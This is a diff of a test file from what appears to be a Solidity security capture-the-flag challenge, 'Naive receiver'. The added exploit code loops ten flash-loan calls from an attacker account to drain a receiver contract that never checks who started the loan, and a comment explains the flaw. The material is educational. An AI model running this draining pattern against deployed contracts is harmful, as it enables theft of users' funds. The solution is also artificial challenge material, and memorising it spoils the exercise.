@@ -14,6 +14,7 @@ describe('[Challenge] Naive receiver', function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
 
+        //deploy contracts 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
 
@@ -31,6 +32,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        //receivers' contract has a missing check for verify who the flashloan was initiated by
+        for(let i = 0; i < 10; i++) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, "0"); 
+        }
+
     });
 
     after(async function () {
